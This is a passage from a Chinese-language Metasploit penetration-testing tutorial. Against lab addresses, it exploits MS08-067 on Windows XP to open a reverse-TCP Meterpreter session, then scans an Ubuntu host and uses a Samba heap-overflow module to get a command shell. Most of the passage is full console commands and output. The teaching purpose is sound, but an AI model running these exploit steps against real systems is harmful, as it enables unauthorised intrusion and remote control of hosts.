### 2003年，由于没有在目标上发现服务器操作系统通常会开放的一些关键端口，因此判断其为服务器操作系统的可能性不大。我们假定目标运行的是英文版的Windows XP。

下面开始实际的攻击过程，首先是设置必需的参数：

```plaintext
msf> search ms08_067_netapi
[*] Searching loaded modules for pattern 'ms08_067_netapi'...
Exploits
Name
Rank
Description
windows/smb/ms08_067_netapi
great
Microsoft Server Service Relative Path Stack Corruption

msf> use windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi)> set PAYLOAD windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp

msf exploit(ms08_067_netapi)> show targets
Exploit targets:
Id  Name
0   Automatic Targeting
1   Windows 2000 Universal
2   Windows XP SP0/SP1 Universal
3   Windows XP SP2 English (NX)
4   Windows XP SP3 English (NX)
5   Windows 2003 SP0 Universal
6   Windows 2003 SP1 English (NO NX)
7   Windows 2003 SP1 English (NX)
8   Windows 2003 SP2 English (NO NX)
9   Windows 2003 SP2 English (NX)
... SNIP ...
26  Windows XP SP2 Japanese (NX)

msf exploit(ms08_067_netapi)> set TARGET 3
target => 3

msf exploit(ms08_067_netapi)> set RHOST 192.168.33.130
RHOST => 192.168.33.130

msf exploit(ms08_067_netapi)> set LHOST 192.168.33.129
LHOST => 192.168.33.129

msf exploit(ms08_067_netapi)> set LPORT 8080
LPORT => 8080

msf exploit(ms08_067_netapi)> show options
Module options:
Name       Current Setting  Required  Description
RHOST      192.168.33.130  yes       The target address
RPORT      445              yes       Set the SMB service port
SMBPIPE    BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

Payload options (windows/meterpreter/reverse_tcp):
Name     Current Setting  Required  Description
EXITFUNC thread           yes       Exit technique: seh, thread, process
LHOST    192.168.33.129   yes       The local address
LPORT    8080             yes       The local port

Exploit target:
Id  Name
--  3   Windows XP SP2 English (NX)
```

我们在Metasploit框架中查找MS08-067 NetAPI攻击模块，并使用`use`命令加载该模块（`windows/smb/ms08_067_netapi`）。接下来，我们设置攻击载荷为基于Windows系统的`Meterpreter reverse_tcp`。这个载荷在攻击成功后，会从目标主机发起一个反弹连接，连接到`LHOST`中指定的IP地址。这种反弹连接可以绕过防火墙的入站流量保护或穿透NAT网关。

`show targets`命令让我们能够识别和匹配目标操作系统类型。大多数MSF渗透攻击模块会自动对目标系统类型进行识别，但针对MS08-067漏洞的攻击通常无法正确地自动识别出系统类型。在此处，我们指定操作系统类型为`Windows XP SP2 English (NX)`。NX（No Execute）表示启用了DEP保护，在Windows XP SP2中，DEP默认是启用的（仅对Windows自身服务程序）。

通过设置`RHOST`参数，我们指定包含MS08-067漏洞的目标主机IP地址。`set LPORT`命令设置攻击机监听的TCP端口号。最后，我们输入`show options`以确认这些参数都已设置正确。

舞台搭好后，真正的好戏就要上演了：

```plaintext
msf exploit(ms08_067_netapi)> exploit
[*] Started reverse handler on 192.168.33.129:8080
[*] Triggering the vulnerability...
[*] Sending stage (748032 bytes)
[*] Meterpreter session 1 opened (192.168.33.129:8080 -> 192.168.33.130:1487)

msf exploit(ms08_067_netapi)> sessions -l
Active sessions
Id  Type                   Information                 Connection
1   meterpreter x86/win32  192.168.33.129:8080 -> 192.168.33.130:1036

msf exploit(ms08_067_netapi)> sessions -i 1
[*] Starting interaction with 1...
meterpreter > shell
Process 4060 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
C:\WINDOWS\system32>
```

我们使用`exploit`命令初始化攻击环境，并开始对目标进行攻击尝试。这次攻击是成功的，为我们返回了一个`reverse_tcp`方式的Meterpreter会话。此时可以使用`sessions -l`命令查看远程运行的Meterpreter情况。可以看到，目前仅有一个会话是活动的。如果想查看每个Meterpreter会话的详细信息，可以输入`sessions -v`。

`sessions -i 1`命令让我们能够与ID为1的控制会话进行交互。注意此时我们进入了Meterpreter的交互shell中。如果控制会话是一个反向连接命令行shell，这个命令会直接把我们带到命令提示符状态下。最后，在`shell`命令下，我们进入了目标系统的交互命令行shell中。

祝贺你，你已经攻陷了你的第一台主机！此时，你仍然可以输入`show options`来查看攻击模块所有可用的命令。

### 5.3 攻击一台Ubuntu主机

让我们对Ubuntu 9.04主机进行一次不同的攻击。攻击的步骤基本与上面例子相同，只是我们需要选择不同的渗透攻击与载荷模块。

```plaintext
msf> nmap -sT -A -P0 192.168.33.132
[*] exec: nmap -sT -A -P0 192.168.33.132
Warning: Traceroute does not support idle or connect scan, disabling..
Nmap scan report for 192.168.33.132
Host is up (0.00048s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.2.3 ((Ubuntu) PHP/5.2.1)
|_html-title: Index of/
139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: MSHOME)
445/tcp  open  netbios-ssn Samba smbd 3.x (workgroup: MSHOME)
MAC Address: 00:0C:29:21:AD:08 (VMware)
No exact OS matches for host (If you know what OS is running on it, see http://nmap.org/submit/ ).
Host script results:
| nbstat: NetBIOS name: UBUNTU, NetBIOS user: , NetBIOS MAC:
| smb-os-discovery:
|   OS: Unix (Samba 3.0.24)
|   Name: MSHOME\Unknown
|   System time: 2011-03-15 17:39:57 UTC-4
|_  OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/
Nmap done: 1 IP address (1 host up) scanned in 47.11 seconds
```

通过nmap扫描，我们看到三个开放的端口：80、139和445。这台主机的操作系统为Ubuntu，并且它正运行着Samba 3.x服务和附带PHP 5.2.1的Apache 2.2.3服务。

让我们搜索一个Samba渗透攻击模块，并尝试用它来攻击这台主机。攻击流程如下：

```plaintext
msf> search samba
[*] Searching loaded modules for pattern 'samba'...
Auxiliary
Name
Rank
Description
admin/smb/samba_symlink_traversal
normal
Samba Symlink Directory Traversal
dos/samba/lsa_addprivs_heap
normal
Samba lsa_io_privilege_set Heap Overflow
dos/samba/lsa_transnames_heap
normal
Samba lsa_io_trans_names Heap Overflow

Exploits
Name
Rank
Description
linux/samba/lsa_transnames_heap
good
Samba lsa_io_trans_names Heap Overflow

msf> use linux/samba/lsa_transnames_heap
msf exploit(lsa_transnames_heap)> show payloads
Compatible Payloads
Name
Rank
Description
generic/debug_trap
normal
Generic x86 Debug Trap
generic/shell_bind_tcp
normal
Generic Command Shell, Bind TCP Inline
generic/shell_reverse_tcp
normal
Generic Command Shell, Reverse TCP Inline
linux/x86/adduser
normal
Linux Add User
linux/x86/chmod
normal
Linux Chmod
linux/x86/exec
normal
Linux Execute Command
linux/x86/metsvc_bind_tcp
normal
Linux Meterpreter Service, Bind TCP
linux/x86/metsvc_reverse_tcp
normal
Linux Meterpreter Service, Reverse TCP Inline
linux/x86/shell/bind_ipv6_tcp
normal
Linux Command Shell, Bind TCP Stager (IPv6)
linux/x86/shell/bind_tcp
normal
Linux Command Shell, Bind TCP Stager

msf exploit(lsa_transnames_heap)> set LPORT 8080
LPORT => 8080

msf exploit(lsa_transnames_heap)> set RHOST 192.168.33.132
RHOST => 192.168.33.132

msf exploit(lsa_transnames_heap)> exploit
[*] Creating nop sled....
[*] Started bind handler
[*] Trying to exploit Samba with address 0xffffe410..
[*] Connecting to the SMB service...
[*] Calling the vulnerable function...
[+] Server did not respond, this is expected
[*] Command shell session 1 opened (192.168.33.129:41551 -> 192.168.33.132:8080)

ifconfig
eth1
Link encap:Ethernet
HWaddr 00:0C:29:21:AD:08
inet addr:192.168.33.132
Bcast:192.168.33.255
```

通过上述步骤，我们成功地对Ubuntu主机进行了渗透攻击，并获得了命令行访问权限。